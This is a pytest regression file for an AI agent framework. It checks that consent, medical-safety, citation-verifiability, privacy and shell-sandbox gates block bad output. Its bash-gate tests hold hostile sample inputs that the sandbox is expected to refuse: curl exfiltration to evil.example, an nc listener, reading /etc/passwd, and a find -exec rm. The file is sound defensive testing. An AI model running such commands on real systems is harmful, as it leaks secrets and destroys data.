"""tests/test_law_gates.py — regression coverage for the law-gate fixes
applied 2026-05-01.

Until 2026-05-01 the kernel laws (L0/L1/L2/L3, L_CONSENT, L_VERIFIABILITY)
were declared in agents/kernel.py but had ZERO production callers — i.e.
declared-but-dead. This file pins the wiring: each test invokes the same
code-paths the generalist's tools use and asserts that violations now
actually block the output.
"""
from __future__ import annotations

import sys
from pathlib import Path
from unittest.mock import patch

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))


# ── 1. providers_status: tier_fallbacks shape ────────────────────────────

def test_providers_status_returns_tier_fallbacks():
    from llm import providers_status
    ps = providers_status()
    assert "tier_chain" in ps
    assert "tier_fallbacks" in ps
    fb = ps["tier_fallbacks"]
    for tier in ("critical", "reasoning", "long", "default", "fast"):
        assert tier in fb, f"tier_fallbacks missing {tier!r}"
        assert isinstance(fb[tier], list)
    # tier_chain primary must equal tier_fallbacks first element
    for tier, primary in ps["tier_chain"].items():
        chain = fb[tier]
        if primary is None:
            assert chain == [], f"{tier}: primary None but chain {chain}"
        else:
            assert chain[0] == primary, f"{tier}: primary {primary} != head {chain[0]}"


# ── 2. email_agent.send → evaluate_l_consent ─────────────────────────────

def test_email_send_blocks_without_user_confirmed():
    from agents import email_agent as E
    with pytest.raises(PermissionError) as exc:
        E.send("a@b.com", "subj", "body", user_confirmed=False)
    assert "L_CONSENT" in str(exc.value)


def test_email_send_passes_consent_when_confirmed(monkeypatch):
    """user_confirmed=True must pass L_CONSENT.

    The send() call still fails downstream when no Gmail creds exist, but
    that's a *different* gate (privacy or service init). We assert the
    failure mode is NOT a consent denial.
    """
    from agents import email_agent as E
    try:
        E.send("a@b.com", "subj", "body", user_confirmed=True)
    except PermissionError as e:
        # If we DO hit a PermissionError, it must not be the consent gate.
        assert "L_CONSENT" not in str(e), f"unexpected consent denial: {e}"
    except Exception:
        # Any other failure (no Gmail creds, etc.) is fine for this test.
        pass


# ── 3. delegate_doctor → evaluate_laws (L0–L3) ───────────────────────────

def test_delegate_doctor_passes_when_laws_ok():
    """When evaluate_laws returns LawsResult(L0..L3 = True), the doctor's
    output must be returned (with Ze advisory header on diagnose/treatment/labs).
    Patch the orchestrator's namespace because it imports evaluate_laws +
    score_decision at module level."""
    from agents import generalist as G
    from agents.kernel import LawsResult, ScoringResult
    fake_out = "Differential: viral URI; supportive care; reassess in 48h."

    class _FakeDoc:
        def diagnose(self, _x): return fake_out
        def treatment(self, _x): return fake_out
        def interpret_labs(self, _x): return fake_out
        def chat(self, _x): return fake_out

    benign_score = ScoringResult(
        impedance_before=0.5, impedance_after=0.3,
        instant_c=0.2, phi_ze=0.8,
        ethics_ze_learn_cheat=0.0,
        ethics_autonomy=1.0, ethics_beneficence=1.0,
        ethics_nonmaleficence=1.0, ethics_justice=1.0,
        ethics_composite=1.0, utility=0.9,
    )
    laws_pass = LawsResult(True, True, True, True, reasons=["ok"] * 4)

    with patch("agents.doctor.DoctorAgent", _FakeDoc), \
         patch("agents.orchestrator.evaluate_laws", return_value=laws_pass), \
         patch("agents.orchestrator.score_decision", return_value=benign_score):
        r = G._t_delegate_doctor("diagnose", "headache 3 days")
        # Output is Ze-annotated but the doctor's text must be intact.
        assert fake_out in r
        assert "[Ze]" in r


def test_delegate_doctor_blocks_when_law_fails():
    """When any law fails, the orchestrator returns ERROR:KERNEL: and the
    raw doctor output is NEVER emitted."""
    from agents import generalist as G
    raw = "Recommend high-dose contraindicated medication X."

    class _FakeDoc:
        def diagnose(self, _x): return raw
        def treatment(self, _x): return raw
        def interpret_labs(self, _x): return raw
        def chat(self, _x): return raw

    from agents.kernel import LawsResult
    bad = LawsResult(L0=True, L1=False, L2=True, L3=True,
                     reasons=["L0 ok",
                              "L1 violation: contraindicated drug for patient",
                              "L2 ok", "L3 ok"])
    with patch("agents.doctor.DoctorAgent", _FakeDoc), \
         patch("agents.orchestrator.evaluate_laws", return_value=bad):
        r = G._t_delegate_doctor("treatment", "fever")
        assert r.startswith("ERROR:KERNEL:")
        assert "L1 violation" in r
        # Raw doctor output must NOT leak through.
        assert raw not in r


# ── 4. delegate_writer → evaluate_l_verifiability ────────────────────────

def test_delegate_writer_blocks_unverifiable_pmid():
    """A writer.review output that cites a fabricated PMID must be blocked."""
    from agents import generalist as G

    bad_text = "This finding is supported by Smith et al. (PMID: 99999999)."

    class _FakeWriter:
        @staticmethod
        def review(text, **kw): return bad_text

    # Also stub enforce_citations to mark PMID 99999999 as unverifiable.
    class _Rep:
        rejected = [{"kind": "PMID", "value": "99999999"}]

    with patch("agents.writer.review", _FakeWriter.review), \
         patch("tools.literature.enforce_citations", return_value=_Rep()):
        r = G._t_delegate_writer("review", {"text": "x", "lang": "en"})
        assert r.startswith("ERROR:VERIFIABILITY:")
        assert "99999999" in r


def test_delegate_writer_passes_when_no_citations():
    """Output with no PMIDs/DOIs has nothing to verify → returned with Ze header."""
    from agents import generalist as G
    clean = "Tighten the second paragraph; the methods section is solid."

    class _Rep:
        rejected = []
        verified = []

    with patch("agents.writer.edit", return_value=clean), \
         patch("tools.literature.enforce_citations", return_value=_Rep()):
        r = G._t_delegate_writer("edit", {"text": "draft"})
        # Ze-everywhere: writer outputs now carry an advisory Ze header.
        assert clean in r
        assert "[Ze]" in r
        assert not r.startswith("ERROR:")


# ── 5. delegate_researcher.summarise → evaluate_l_verifiability ──────────

def test_delegate_researcher_summarise_blocks_unverifiable_doi():
    from agents import generalist as G
    bad_summary = "See doi:10.9999/fake.2026.000999 for the full analysis."

    class _Rep:
        rejected = [{"kind": "DOI", "value": "10.9999/fake.2026.000999"}]

    with patch("agents.researcher.summarise", return_value=bad_summary), \
         patch("tools.literature.enforce_citations", return_value=_Rep()):
        r = G._t_delegate_researcher(
            "summarise", {"records": [{"pmid": "1"}], "lang": "en"})
        assert r.startswith("ERROR:VERIFIABILITY:")
        assert "10.9999/fake.2026.000999" in r


def test_delegate_researcher_find_skips_verifiability_gate():
    """`find` returns raw search rows, not emitted prose — gate not applied."""
    from agents import generalist as G
    rows = [{"pmid": "33115936", "title": "real article"}]
    with patch("agents.researcher.find", return_value=rows):
        r = G._t_delegate_researcher("find", {"query": "anything"})
        # Output is JSON-encoded rows, NOT a verifiability-error.
        assert "33115936" in r
        assert not r.startswith("ERROR:VERIFIABILITY:")


# ── 6. delegate_coder & delegate_parallel through orchestrate ────────────

def test_delegate_coder_blocks_patients_path():
    """L_PRIVACY pre-check on coder file list."""
    from agents import generalist as G
    r = G._t_delegate_coder(
        files=["/home/oem/Desktop/AIM/Patients/X/foo.py"],
        instruction="rename Foo to Bar")
    assert r.startswith("ERROR:PERMISSION:")
    assert "L_PRIVACY" in r


def test_delegate_coder_routes_through_orchestrate(monkeypatch):
    """Non-Patients code edits must invoke orchestrate (not the agent directly)."""
    from agents import generalist as G
    seen: dict[str, bool] = {"orchestrate": False}

    def _fake_orch(decision, service_fn, **kw):
        seen["orchestrate"] = True
        return f"[Ze-mock]\n\n{service_fn()}"

    class _FakeCoder:
        def __init__(self, files): pass
        def edit(self, _instr): return "patched"

    monkeypatch.setattr("agents.orchestrator.orchestrate", _fake_orch)
    monkeypatch.setattr("agents.coder.CoderAgent", _FakeCoder)
    r = G._t_delegate_coder(files=["/tmp/foo.py"], instruction="x")
    assert seen["orchestrate"], "delegate_coder must call orchestrate()"
    assert "patched" in r


def test_delegate_parallel_routes_through_orchestrate(monkeypatch):
    from agents import generalist as G
    seen: dict[str, bool] = {"orchestrate": False, "decision_action": ""}

    def _fake_orch(decision, service_fn, **kw):
        seen["orchestrate"] = True
        seen["decision_action"] = decision.action_type
        return service_fn()

    monkeypatch.setattr("agents.orchestrator.orchestrate", _fake_orch)
    # Stub generalist.run so sub-tasks return immediately.
    monkeypatch.setattr("agents.generalist.run",
                        lambda t, **kw: {"answer": f"ok:{t}"})
    r = G._t_delegate_parallel(["a", "b"], synthesise=False)
    assert seen["orchestrate"], "delegate_parallel must call orchestrate()"
    assert seen["decision_action"] == "parallel_dispatch"


def test_ze_event_persisted_on_pass(tmp_path, monkeypatch):
    """Successful orchestrate writes one ze_events row with blocked_at=NULL."""
    import sqlite3
    from agents.orchestrator import orchestrate
    from agents.kernel import Decision

    # Redirect SQLite to a temp file so we don't touch aim.db.
    db_file = tmp_path / "test_ze.db"
    monkeypatch.setattr("config.DB_PATH", db_file)
    # Re-import db module after monkey-patch so _conn picks up the new path.
    import importlib
    import db as _db
    importlib.reload(_db)

    decision = Decision(id="t.pass", description="t",
                        action_type="emit_text",
                        payload={"text": "hello"})
    out = orchestrate(decision, lambda: "world")
    assert "world" in out

    with sqlite3.connect(str(db_file)) as c:
        rows = c.execute(
            "SELECT decision_id, action_type, blocked_at, utility "
            "FROM ze_events WHERE decision_id='t.pass'").fetchall()
    assert len(rows) == 1
    assert rows[0][0] == "t.pass"
    assert rows[0][1] == "emit_text"
    assert rows[0][2] is None  # not blocked
    assert rows[0][3] is not None  # utility computed


def test_ze_verify_match_when_hypothesis_aligns_with_observation():
    """ze_verify returns MATCH when hypothesis tokens are largely in observation."""
    import json as _json
    from agents.generalist import _t_ze_verify
    out = _json.loads(_t_ze_verify(
        hypothesis="phi formula at orchestrator.py:121 returns 1.0 default",
        observation=("agents/orchestrator.py:113: phi = 1.0\n"
                     "agents/orchestrator.py:121: phi = max(0.0, 1.0 - "
                     "2.0 * (rejected / checked))"),
    ))
    assert out["verdict"] == "MATCH"
    assert out["match_score"] >= 0.85


def test_ze_verify_mismatch_when_hypothesis_is_wrong():
    """ze_verify returns MISMATCH (or PARTIAL) when hypothesis is far from observation."""
    import json as _json
    from agents.generalist import _t_ze_verify
    out = _json.loads(_t_ze_verify(
        hypothesis="metrics_json column exists in ze_events table at db.py",
        observation=("CREATE TABLE IF NOT EXISTS ze_events (\n"
                     "  id INTEGER PRIMARY KEY,\n"
                     "  decision_id TEXT, action_type TEXT,\n"
                     "  blocked_at TEXT, impedance_before REAL,\n"
                     "  impedance_after REAL, instant_c REAL,\n"
                     "  phi_ze REAL, utility REAL,\n"
                     "  payload_chars INTEGER, output_chars INTEGER)"),
    ))
    assert out["verdict"] in ("MISMATCH", "PARTIAL")
    # The fabricated 'metrics_json' token should appear in missing_from_observation
    assert any("metrics" in t.lower() for t in out["missing_from_observation"])
    assert "DO NOT ASSERT" in out["advice"]


def test_ze_verify_invalid_inputs_handled():
    import json as _json
    from agents.generalist import _t_ze_verify
    out = _json.loads(_t_ze_verify(hypothesis="", observation="foo"))
    assert out["verdict"] == "INVALID"
    out = _json.loads(_t_ze_verify(hypothesis="foo", observation=""))
    assert out["verdict"] == "INVALID"


# ── 7. Auto Ze-verify post-stage in orchestrator ─────────────────────────

def test_orchestrate_auto_verify_flags_fake_file_line():
    """Output containing a fabricated path:line ref must be flagged with
    [Ze-verify] header before returning."""
    from agents.orchestrator import orchestrate
    from agents.kernel import Decision
    decision = Decision(id="t.fakeref", description="t",
                        action_type="emit_text",
                        payload={"text": "hello"})
    fake_output = "See agents/this_module_does_not_exist.py:9999 for details."
    r = orchestrate(decision, lambda: fake_output)
    assert "[Ze-verify]" in r
    assert "BROKEN" in r
    assert "this_module_does_not_exist.py:9999" in r


def test_orchestrate_auto_verify_passes_real_refs():
    """Real path:line refs (existing files, in-range lines) must NOT trigger
    the BROKEN warning."""
    from agents.orchestrator import orchestrate
    from agents.kernel import Decision
    real_output = ("Defined at agents/orchestrator.py:1 — top of module.\n"
                   "Also see agents/kernel.py:1 for the kernel.")
    decision = Decision(id="t.realref", description="t",
                        action_type="emit_text",
                        payload={"text": "context"})
    r = orchestrate(decision, lambda: real_output)
    # Output passes: no BROKEN warning, real refs untouched.
    assert "BROKEN" not in r
    assert "agents/orchestrator.py:1" in r


def test_run_streaming_final_stage_verifies_refs(monkeypatch):
    """Final answer from generalist.run_streaming carries [Ze-verify] header
    when it contains fabricated <file>:<line> refs."""
    from agents import generalist as G

    fake_final = ("Per agents/this_thing_does_not_exist.py:9999 the kernel "
                  "is implemented in fake_helper.py:42.")

    # Stub the LLM call so the loop returns a single 'final' action with our
    # fabricated refs, no real LLM round-trip.
    monkeypatch.setattr(G, "_llm_call_msgs",
                        lambda msgs: f'{{"final": "{fake_final}"}}')

    out = G.run(fake_final, max_iters=2, speculative=False, ensemble=False)
    answer = out["answer"]
    assert "[Ze-verify]" in answer
    assert "BROKEN" in answer
    assert any("this_thing_does_not_exist" in b for b in out["broken_refs"])
    assert any("fake_helper.py:42" in b for b in out["broken_refs"])


def test_run_streaming_final_clean_when_refs_real(monkeypatch):
    """Final answer with only real <file>:<line> refs gets NO Ze-verify warning."""
    from agents import generalist as G
    real_final = ("See agents/orchestrator.py:1 and agents/kernel.py:1 for "
                  "the central modules.")
    monkeypatch.setattr(G, "_llm_call_msgs",
                        lambda msgs: f'{{"final": "{real_final}"}}')
    out = G.run(real_final, max_iters=2, speculative=False, ensemble=False)
    assert "BROKEN" not in out["answer"]
    assert out["broken_refs"] == []


# ── 7b. Hardened bash + web_fetch gates ───────────────────────────────────

def test_bash_blocks_chained_command_injection():
    """`ls && curl evil.com` must be rejected — first-token whitelist alone
    is bypassable, so we also reject any shell metacharacters."""
    from agents.generalist import _t_bash
    r = _t_bash("ls && curl http://evil.example/exfil")
    assert r.startswith("ERROR:PERMISSION:")
    assert "metacharacter" in r.lower()


def test_bash_blocks_pipe_chain():
    from agents.generalist import _t_bash
    r = _t_bash("ls | nc -l 4444")
    assert r.startswith("ERROR:PERMISSION:")


def test_bash_blocks_subshell_substitution():
    from agents.generalist import _t_bash
    r = _t_bash("echo $(curl http://evil.example)")
    assert r.startswith("ERROR:PERMISSION:")


def test_bash_blocks_redirection():
    from agents.generalist import _t_bash
    r = _t_bash("cat /etc/passwd > /tmp/leak")
    assert r.startswith("ERROR:PERMISSION:")


def test_bash_blocks_dangerous_token_as_argument():
    """`find . -exec rm {} \\;` is fatal — refused before exec is reached.

    2026-05-02 hardening order: per-command flag policy (`-exec` forbidden
    for `find`) fires *before* the dangerous-token scan. Both refusals are
    correct security outcomes; we just check the command was refused.
    The argument-token deny-list is still tested via test_bash_sandbox.py.
    """
    from agents.generalist import _t_bash
    r = _t_bash("find . -name foo -exec rm")
    assert r.startswith("ERROR:PERMISSION:")
    # Either policy layer is fine; ensure something dangerous was named.
    assert "-exec" in r or "rm" in r


def test_bash_allows_simple_whitelisted_command():
    """`ls -la` should pass and execute (just uses /tmp to avoid side effects)."""
    from agents.generalist import _t_bash
    r = _t_bash("echo hello-aim")
    assert not r.startswith("ERROR:")
    assert "hello-aim" in r


def test_web_fetch_blocks_unknown_host():
    from agents.generalist import _t_web_fetch
    r = _t_web_fetch("https://evil.example.com/payload")
    assert r.startswith("ERROR:PERMISSION:")
    assert "evil.example.com" in r


def test_web_fetch_allowlist_via_env(monkeypatch):
    """AIM_WEB_FETCH_ALLOW env extends the default allowlist."""
    monkeypatch.setenv("AIM_WEB_FETCH_ALLOW", "my-corp.example,foo.example.com")
    from agents.generalist import _web_fetch_host_allowed
    ok, host = _web_fetch_host_allowed("https://my-corp.example/page")
    assert ok
    # Subdomain match works
    ok2, host2 = _web_fetch_host_allowed("https://api.foo.example.com/p")
    assert ok2


def test_web_fetch_default_allows_pubmed():
    from agents.generalist import _web_fetch_host_allowed
    ok, _ = _web_fetch_host_allowed("https://pubmed.ncbi.nlm.nih.gov/12345/")
    assert ok


# ── 8. AST verify (semantic checks beyond regex) ─────────────────────────

def test_ast_def_at_finds_function():
    from pathlib import Path
    from agents.ast_verify import def_at
    p = Path(__file__).resolve().parent.parent / "agents" / "orchestrator.py"
    sym = def_at(p, 273)  # def orchestrate(...) per current file
    # Whatever the actual line, def_at must return a real symbol when given
    # a real def's lineno. Search a window for the function we know exists.
    import ast
    src = p.read_text(encoding="utf-8")
    tree = ast.parse(src)
    target = next((n for n in tree.body
                   if isinstance(n, ast.FunctionDef) and n.name == "orchestrate"),
                  None)
    assert target is not None
    sym = def_at(p, target.lineno)
    assert sym is not None
    assert sym.name == "orchestrate"
    assert sym.kind == "def"


def test_ast_def_at_returns_none_for_blank_line():
    from pathlib import Path
    from agents.ast_verify import def_at
    p = Path(__file__).resolve().parent.parent / "agents" / "orchestrator.py"
    # Line 1 is the docstring; not a top-level def/class/const → None
    assert def_at(p, 1) is None


def test_ast_find_callers_excludes_imports():
    """Imports should NOT count as callers."""
    from pathlib import Path
    from agents.ast_verify import find_callers
    root = Path(__file__).resolve().parent.parent
    callers = find_callers("evaluate_l_consent", root)
    # We expect at least 2 real call-sites: orchestrator and email_agent.
    files = {c.file for c in callers}
    assert any(f.endswith("orchestrator.py") for f in files)
    assert any(f.endswith("email_agent.py") for f in files)


def test_ast_extract_claims_finds_symbol_at_line_pattern():
    from agents.ast_verify import extract_claims
    text = "The function orchestrate @ orchestrator.py:273 routes everything."
    claims = extract_claims(text)
    syms = [c for c in claims if c.kind == "symbol_at_line"]
    assert any(c.symbol == "orchestrate" and c.line == 273 for c in syms)


def test_ast_extract_claims_finds_negative_call():
    from agents.ast_verify import extract_claims
    text = "evaluate_l3 has 0 external callers (verified by grep)."
    claims = extract_claims(text)
    nc = [c for c in claims if c.kind == "negative_call"]
    assert any(c.symbol == "evaluate_l3" for c in nc)


def test_ast_verify_claims_flags_wrong_symbol_at_line():
    """Real file, real line, but wrong symbol → BAD."""
    from pathlib import Path
    from agents.ast_verify import verify_claims
    root = Path(__file__).resolve().parent.parent
    # def orchestrate is around line ~273; assert "score_decision @ orchestrator.py:273"
    # which is wrong (score_decision is in kernel.py)
    text = "Per docs, score_decision @ orchestrator.py:273 handles everything."
    rep = verify_claims(text, search_root=root)
    assert rep.total >= 1
    assert any("score_decision" in b for b in rep.bad)


def test_ast_verify_claims_passes_correct_symbol_at_line():
    from pathlib import Path
    import ast
    from agents.ast_verify import verify_claims
    root = Path(__file__).resolve().parent.parent
    p = root / "agents" / "orchestrator.py"
    src = p.read_text(encoding="utf-8")
    target = next((n for n in ast.parse(src).body
                   if isinstance(n, ast.FunctionDef) and n.name == "orchestrate"),
                  None)
    text = f"The orchestrator's main entry is orchestrate @ orchestrator.py:{target.lineno}."
    rep = verify_claims(text, search_root=root)
    assert rep.bad == [], rep.bad
    assert rep.ok >= 1


def test_ast_verify_claims_flags_negative_call_when_real_callers_exist():
    from pathlib import Path
    from agents.ast_verify import verify_claims
    root = Path(__file__).resolve().parent.parent
    text = "evaluate_l_consent has 0 external callers in the codebase."
    rep = verify_claims(text, search_root=root)
    # We added real callers in 2026-05-02 fix; this negative claim must fail.
    assert any("evaluate_l_consent" in b and "0 callers" in b for b in rep.bad), \
        f"expected a 0-callers failure, got: {rep.bad}"


def test_ze_verify_symbol_tool_match():
    import json as _json
    from pathlib import Path
    import ast
    from agents.generalist import _t_ze_verify_symbol
    p = Path(__file__).resolve().parent.parent / "agents" / "orchestrator.py"
    src = p.read_text(encoding="utf-8")
    target = next((n for n in ast.parse(src).body
                   if isinstance(n, ast.FunctionDef) and n.name == "orchestrate"),
                  None)
    out = _json.loads(_t_ze_verify_symbol(
        symbol="orchestrate", file=str(p), line=target.lineno, kind="def"))
    assert out["verdict"] == "MATCH"


def test_ze_verify_symbol_tool_wrong_symbol():
    import json as _json
    from pathlib import Path
    import ast
    from agents.generalist import _t_ze_verify_symbol
    p = Path(__file__).resolve().parent.parent / "agents" / "orchestrator.py"
    src = p.read_text(encoding="utf-8")
    target = next((n for n in ast.parse(src).body
                   if isinstance(n, ast.FunctionDef) and n.name == "orchestrate"),
                  None)
    out = _json.loads(_t_ze_verify_symbol(
        symbol="i_do_not_exist", file=str(p), line=target.lineno, kind="def"))
    assert out["verdict"] == "WRONG_SYMBOL"
    assert out["actual_symbol"] == "orchestrate"


def test_ze_verify_symbol_tool_file_not_found():
    import json as _json
    from agents.generalist import _t_ze_verify_symbol
    out = _json.loads(_t_ze_verify_symbol(
        symbol="anything", file="not/a/real/file.py", line=1))
    assert out["verdict"] == "FILE_NOT_FOUND"


def test_orchestrate_auto_ast_flags_wrong_symbol_at_line():
    """Output asserts symbol_at_line that is semantically wrong → [Ze-AST] header."""
    from agents.orchestrator import orchestrate
    from agents.kernel import Decision
    decision = Decision(id="t.ast.bad", description="t",
                        action_type="emit_text",
                        payload={"text": "x"})
    # claim: score_decision is at orchestrator.py:1 (it isn't; that's a docstring)
    out = orchestrate(decision, lambda: "see score_decision @ orchestrator.py:1 for details")
    assert "[Ze-AST]" in out
    assert "WRONG" in out


def test_resolve_path_finds_bare_basename_in_subdirs():
    """Bare 'orchestrator.py' should resolve to agents/orchestrator.py."""
    from agents.orchestrator import orchestrate
    from agents.kernel import Decision
    decision = Decision(id="t.bare", description="t",
                        action_type="emit_text",
                        payload={"text": "x"})
    # Bare basename + valid line should NOT trigger BROKEN.
    out = orchestrate(decision, lambda: "see orchestrator.py:1 for module top")
    assert "BROKEN" not in out


def test_orchestrate_auto_verify_catches_out_of_range_line():
    """Existing file but absurdly large line number → still flagged."""
    from agents.orchestrator import orchestrate
    from agents.kernel import Decision
    output = "See agents/orchestrator.py:999999 for the magic"
    decision = Decision(id="t.oor", description="t",
                        action_type="emit_text",
                        payload={"text": "x"})
    r = orchestrate(decision, lambda: output)
    assert "[Ze-verify]" in r
    assert "out of range" in r


def test_ze_event_persisted_on_block(tmp_path, monkeypatch):
    """Blocked orchestrate writes one ze_events row with blocked_at set."""
    import sqlite3
    from agents.orchestrator import orchestrate
    from agents.kernel import Decision, LawsResult

    db_file = tmp_path / "test_ze_block.db"
    monkeypatch.setattr("config.DB_PATH", db_file)
    import importlib
    import db as _db
    importlib.reload(_db)

    monkeypatch.setattr(
        "agents.orchestrator.evaluate_laws",
        lambda *a, **kw: LawsResult(False, True, True, True,
                                    reasons=["L0 violation"] + ["ok"] * 3))

    decision = Decision(id="t.block", description="t",
                        action_type="dx", payload={})
    out = orchestrate(decision, lambda: "should_not_run")
    assert out.startswith("ERROR:KERNEL:")

    with sqlite3.connect(str(db_file)) as c:
        rows = c.execute(
            "SELECT decision_id, blocked_at FROM ze_events "
            "WHERE decision_id='t.block'").fetchall()
    assert len(rows) == 1
    assert rows[0][1] == "L0-3"
